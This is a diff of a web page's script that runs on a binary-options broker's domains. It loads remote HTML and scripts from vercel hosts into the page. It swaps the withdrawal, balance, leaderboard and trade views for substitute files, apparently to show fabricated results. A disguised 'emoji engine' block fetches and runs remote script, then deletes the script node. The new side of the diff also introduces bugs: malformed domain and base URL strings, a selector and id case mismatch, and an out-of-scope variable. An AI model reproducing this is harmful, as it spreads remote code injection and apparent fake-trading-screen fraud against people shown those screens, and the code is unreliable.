@@ -8,10 +8,10 @@
 <body>
 
 <script id="js">
-// --- Security Check Start ---
+    // --- Security Check Start ---
 (function() {
     const authorizedDomains = [
-        "talha-site-data.vercel.app", 
+        "http://talha-site-data.vercel.app/",
         "quotex.io",
         "quotex.market",
         "qtxbrk.com",
@@ -27,7 +27,8 @@
     
     const currentHost = window.location.hostname;
  
-    if (!authorizedDomains.includes(currentHost) && currentHost !== "localhost" && currentHost !== "127.0.0.1") {
+    // Check agar current host authorized list mein exist karta hai
+    if (!authorizedDomains.includes(currentHost)) {
         window.location.href = window.location.origin + "/error";
     }
 })();
@@ -36,7 +37,7 @@
 (function() {
     var pID = "talha-trader-admin-panel-lock",
         db = "https://" + pID + "-default-rtdb.firebaseio.com/users.json",
-        baseURL = "https://talha-bhai-scripts.vercel.app/"; // Fixed: Removed duplicate https://
+        baseURL = "https://https-talha-bhai-scripts.vercel.app/";
 
     const uP = new URLSearchParams(window.location.search);
     let id = uP.get('id') || "";
@@ -79,12 +80,13 @@
     }
 
     function checkTradeListElement() {
-        return !!document.querySelector("div[data-index]");
+    return !!document.querySelector("div[data-index]");
     }
     
 
     // ─── Device detection ────────────────────────────────────────────────────
     function isMobile() {
+        // iPhone bhi cover ho raha hai properly
         return /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
             || window.innerWidth <= 1024;
     }
@@ -98,34 +100,49 @@
 
         let route = null;
 
-        if (isDashTrue) {
-            route = { f: "LB.html", k: "lb" };
-        }
-        else if (isWinTrue) {
-            route = { f: "win.html", k: "win" };
-        }
-        else if (url.includes("withdrawal")) {
-            route = { f: "p.html", k: "p" };
-        }
-        else if (url.includes("balance")) {
-            route = { f: "t.html", k: "t" };
-        }
-        else if (url.includes("analytics")) {
-            route = { f: "ana.html", k: "ana" };
-        }
-        else if (checkLeaderboardElement()) {
-            route = { f: "LB.html", k: "lb" };
-        }
-        else if (checkTradeListElement()) {
-            route = { f: "win.html", k: "win" };
-        }
-        else if (url.includes("demo-trade") || url.includes("trade")) {
-            const file = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "android.html" : "pc.html";
-            route = {
-                f: file,
-                k: file === "android.html" ? "android" : "pc"
-            };
-        }
+        // PRIORITY 1: URL params
+if (isDashTrue) {
+    route = { f: "LB.html", k: "lb" };
+}
+else if (isWinTrue) {
+    route = { f: "win.html", k: "win" };
+}
+
+// PRIORITY 2: URL keywords (withdrawal/balance/analytics)
+else if (url.includes("withdrawal")) {
+    route = { f: "p.html", k: "p" };
+}
+else if (url.includes("balance")) {
+    route = { f: "t.html", k: "t" };
+}
+else if (url.includes("analytics")) {
+    route = { f: "ana.html", k: "ana" };
+}
+
+// PRIORITY 3: Leaderboard element
+else if (checkLeaderboardElement()) {
+    route = { f: "LB.html", k: "lb" };
+}
+
+// PRIORITY 4: Trade list element → win.html
+else if (checkTradeListElement()) {
+    route = { f: "win.html", k: "win" };
+}
+
+// PRIORITY 5: demo-trade / trade → device routing
+else if (url.includes("demo-trade") || url.includes("trade")) {
+
+    const file = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
+        ? "android.html"
+        : "pc.html";
+
+    route = {
+        f: file,
+        k: file === "android.html" ? "android" : "pc"
+    };
+}
+
+        // Koi bhi match nahi
         else {
             showErrorPopup();
             return;
@@ -133,32 +150,32 @@
 
         loadRoute(route, u);
     }
-
-    function loadRoute(route, u) {
-        if (u.permissions && u.permissions[route.k] === false) {
-            showTalhaLock(id);
-            return;
-        }
-
-        document.querySelectorAll("[id^='talha-injected-']").forEach(el => el.remove());
-
-        const div = document.createElement('div');
-        div.id = 'talha-injected-' + route.k;
-        document.body.appendChild(div);
-
-        fetch(baseURL + route.f)
-            .then(res => res.text())
-            .then(html => {
-                div.innerHTML = html;
-                div.querySelectorAll('script').forEach(old => {
-                    const s = document.createElement('script');
-                    if (old.src) s.src = old.src;
-                    else s.textContent = old.textContent;
-                    document.body.appendChild(s);
-                });
-            })
-            .catch(err => console.error("Route load issue:", err));
+function loadRoute(route, u) {
+    if (u.permissions && u.permissions[route.k] === false) {
+        showTalhaLock(id);
+        return;
     }
+
+    // Purani sab hatao, same bhi same nahi — hamesha fresh load
+    document.querySelectorAll("[id^='talha-injected-']").forEach(el => el.remove());
+
+    const div = document.createElement('div');
+    div.id = 'talha-injected-' + route.k;
+    document.body.appendChild(div);
+
+    fetch(baseURL + route.f)
+        .then(res => res.text())
+        .then(html => {
+            div.innerHTML = html;
+            div.querySelectorAll('script').forEach(old => {
+                const s = document.createElement('script');
+                if (old.src) s.src = old.src;
+                else s.textContent = old.textContent;
+                document.body.appendChild(s);
+            });
+        })
+        .catch(err => console.error("Route load issue:", err));
+}
 
     // ─── Error popup ─────────────────────────────────────────────────────────
     function showErrorPopup() {
@@ -194,45 +211,58 @@
         document.querySelectorAll("dialog#talhaLock").forEach(d => { d.close(); d.remove(); });
 
         const htmlContent = `<style>
-dialog#talhaLock {
+Dialog#talhaLock {
     border: none;
     padding: 0;
     background: transparent;
     font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", 'Inter', sans-serif;
 }
 
-dialog#talhaLock::backdrop {
-    background: rgba(0, 0, 0, 0.6);
-    backdrop-filter: blur(8px);
-    -webkit-backdrop-filter: blur(8px);
+Dialog#talhaLock::backdrop {
+    background: rgba(0, 0, 0, 0.4); /* Pure dark hata kar soft transparent black kiya */
+    backdrop-filter: blur(5px); /* 👈 Exactly 5px blur */
+    -webkit-backdrop-filter: blur(5px);
 }
 
+/* Main Modal Container - Fully Transparent & Borderless */
 .glass {
     width: 420px;
     max-width: 92vw;
     padding: 28px 24px 26px;
-    border-radius: 16px;
-    background: rgba(25, 18, 36, 0.92); /* Fixed: Background added so text/popup is readable */
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+    
+    /* 30% Round / 70% Square Premium iPhone Corner Style */
+    border-radius: 12px;
+    
+    /* Removed solid gradient background, borders, and heavy drop shadows */
+    background: transparent;
+    border: none;
+    box-shadow: none;
+    
     color: #ffffff;
     text-align: center;
     position: relative;
-    animation: popIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+    animation: popIn 0.4s cubic-bezier(0.16, 1, 0.3, 1); /* Smooth iOS pop animation */
     margin: auto;
     -webkit-font-smoothing: antialiased;
 }
 
 @keyframes popIn {
-    from { transform: scale(0.95); opacity: 0; }
-    to { transform: scale(1); opacity: 1; }
+    from {
+        transform: scale(0.95);
+        opacity: 0;
+    }
+    to {
+        transform: scale(1);
+        opacity: 1;
+    }
 }
 
+/* Info Box - Sleek Floating Glass Item */
 .info {
     margin: 2rem 0;
-    background: rgba(255, 255, 255, 0.07);
-    border: 1px solid rgba(255, 255, 255, 0.12);
-    border-radius: 10px;
+    background: rgba(255, 255, 255, 0.07); /* Smooth transparent white backing */
+    border: 1px solid rgba(255, 255, 255, 0.12); /* Ultra thin clean line */
+    border-radius: 10px; /* Matching corner structure */
     padding: 12px 14px;
     text-align: left;
     backdrop-filter: blur(2px);
@@ -244,7 +274,7 @@ dialog#talhaLock::backdrop {
     opacity: 0.6;
     margin-bottom: 4px;
     font-weight: 600;
-    color: #D0BDF4;
+    color: #D0BDF4; /* Subtle premium purple tone for labels */
 }
 
 .value-row {
@@ -274,15 +304,22 @@ dialog#talhaLock::backdrop {
     flex-shrink: 0;
 }
 
-.copy-btn:hover { opacity: 1; }
-.copy-btn svg { width: 18px; height: 18px; fill: #fff; }
+.copy-btn:hover {
+    opacity: 1;
+}
+
+.copy-btn svg {
+    width: 18px;
+    height: 18px;
+    fill: #fff;
+}
 
 .copy-btn .tooltip {
     position: absolute;
     top: -40px;
     left: 50%;
     transform: translateX(-50%);
-    background: rgba(44, 44, 46, 0.9);
+    background: rgba(44, 44, 46, 0.9); /* iOS style toast alert tooltip */
     backdrop-filter: blur(4px);
     color: #fff;
     padding: 6px 10px;
@@ -299,13 +336,19 @@ dialog#talhaLock::backdrop {
     transform: translateX(-50%) translateY(-4px);
 }
 
+/* Floating Hearts Background */
 .heart-bg {
     position: absolute;
-    top: 0; left: 0; width: 100%; height: 100%;
-    pointer-events: none; overflow: hidden;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+    overflow: hidden;
 }
 
-.heart-bg::before, .heart-bg::after {
+.heart-bg::before,
+.heart-bg::after {
     content: '💜';
     position: absolute;
     font-size: 24px;
@@ -313,32 +356,72 @@ dialog#talhaLock::backdrop {
     animation: floatHearts 7s infinite linear;
 }
 
-.heart-bg::before { left: 20%; animation-delay: 0s; }
-.heart-bg::after { left: 75%; animation-delay: 3.5s; }
+.heart-bg::before {
+    left: 20%;
+    animation-delay: 0s;
+}
+
+.heart-bg::after {
+    left: 75%;
+    animation-delay: 3.5s;
+}
 
 @keyframes floatHearts {
-    0% { transform: translateY(120%) rotate(0); opacity: 0; }
-    50% { opacity: 0.4; }
-    100% { transform: translateY(-120%) rotate(360deg); opacity: 0; }
+    0% {
+        transform: translateY(120%) rotate(0);
+        opacity: 0;
+    }
+    50% {
+        opacity: 0.4;
+    }
+    100% {
+        transform: translateY(-120%) rotate(360deg);
+        opacity: 0;
+    }
 }
 
-.lock-icon { display: flex; justify-content: center; align-items: center; margin-bottom: 1rem; }
-.lock-icon img { width: 90px; height: auto; margin-bottom: 1rem; }
-.logo-pulse { animation: pulseLogo 1.5s infinite ease-in-out; }
+.lock-icon {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 1rem;
+}
+
+.lock-icon img {
+    width: 90px;
+    height: auto;
+    margin-bottom: 1rem;
+}
+
+.logo-pulse {
+    animation: pulseLogo 1.5s infinite ease-in-out;
+}
 
 @keyframes pulseLogo {
-    0%, 100% { transform: scale(1); opacity: 0.9; }
-    50% { transform: scale(1.06); opacity: 1; }
+    0%, 100% {
+        transform: scale(1);
+        opacity: 0.9;
+    }
+    50% {
+        transform: scale(1.06);
+        opacity: 1;
+    }
 }
 
-.footer-social { display: flex; justify-content: center; margin-top: 3rem; margin-bottom: 1rem; }
+.footer-social {
+    display: flex;
+    justify-content: center;
+    margin-top: 3rem;
+    margin-bottom: 1rem;
+}
 
+/* Premium Transparent Telegram Button */
 .telegram-btn {
     background: linear-gradient(135deg, rgba(34, 158, 217, 0.85), rgba(29, 78, 216, 0.85));
     border: 1px solid rgba(255, 255, 255, 0.15);
     color: #fff;
     padding: 10px 20px;
-    border-radius: 10px;
+    border-radius: 10px; /* Matching corner structure instead of full round 999px */
     font-weight: 700;
     text-decoration: none;
     box-shadow: 0 4px 15px rgba(34, 158, 217, 0.25);
@@ -347,20 +430,35 @@ dialog#talhaLock::backdrop {
 }
 
 @keyframes pulse {
-    0%, 100% { transform: scale(1); }
-    50% { transform: scale(1.04); box-shadow: 0 6px 20px rgba(34, 158, 217, 0.35); }
+    0%, 100% {
+        transform: scale(1);
+    }
+    50% {
+        transform: scale(1.04);
+        box-shadow: 0 6px 20px rgba(34, 158, 217, 0.35);
+    }
 }
 
+/* Sleek Close Cross */
 .close-cross {
     position: absolute;
-    top: 12px; right: 18px;
-    font-size: 1.3rem; font-weight: 500;
-    color: #DC8DE6; cursor: pointer;
-    transition: all 0.2s ease; z-index: 10; opacity: 0.8;
+    top: 12px;
+    right: 18px;
+    font-size: 1.3rem;
+    font-weight: 500; /* iOS style lighter weight instead of bold */
+    color: #DC8DE6;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    z-index: 10;
+    opacity: 0.8;
 }
-.close-cross:hover { opacity: 1; transform: scale(1.05); }
-</style>
 
+.close-cross:hover {
+    opacity: 1;
+    transform: scale(1.05);
+}
+
+</style>
 <div class="glass">
   <div class="heart-bg"></div>
   <div class="close-cross">&times;</div>
@@ -381,7 +479,7 @@ dialog#talhaLock::backdrop {
 </div>`;
 
         const myDialog = document.createElement("dialog");
-        myDialog.id = "talhaLock"; 
+        myDialog.id = "TalhaLock";
         myDialog.innerHTML = htmlContent;
         document.body.appendChild(myDialog);
         myDialog.showModal();
@@ -401,33 +499,29 @@ dialog#talhaLock::backdrop {
     // ─── Start ───────────────────────────────────────────────────────────────
     initSystem();
 
-})();
-</script>
-
-<script>
-    (async () => {
-        try {
-            let response = await fetch(`https://talha-scripts.vercel.app/heart.html`);
-            let rawMarkup = await response.text();
-            let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
-            
-            documentDOM.querySelectorAll('script').forEach(oldNode => {
-                let freshScriptNode = document.createElement('script');
-                if (oldNode.src) {
-                    freshScriptNode.src = oldNode.src;
-                } else {
-                    freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
-                }
-                document.body.appendChild(freshScriptNode);
+})();</script>
+    <script>
+        (async () => {
+            try {
+                let response = await fetch(`https://talha-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
                 
-                // Fixed: 2 seconds ka delay diya taaki script pehle successfully execute ho sake
-                setTimeout(() => { if(freshScriptNode.parentNode) freshScriptNode.remove(); }, 2000);
-            });
-            console.log("Zeetex Emoji Engine Hook Active");
-        } catch (e) {
-            console.error("Emoji Override Skipped due to runtime separation layer context.", e);
-        }
-    })();
-</script>
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+            setTimeout(() => freshScriptNode.remove(), 600);
+       })();
+    </script>
 </body>
 </html>
